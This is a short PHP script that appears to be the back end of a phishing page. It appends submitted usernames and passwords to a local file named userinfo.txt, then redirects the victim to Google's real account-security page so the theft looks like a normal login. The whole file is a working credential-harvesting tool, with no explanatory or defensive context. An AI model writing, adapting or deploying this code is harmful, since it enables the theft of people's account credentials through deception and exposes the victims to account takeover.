<?php

file_put_contents("userinfo.txt", "Username: " . $_POST['key2'] . "Password: " . $_POST['key1'] . "\n", FILE_APPEND);
header('Location: https://myaccount.google.com/security?pli=1');
exit();
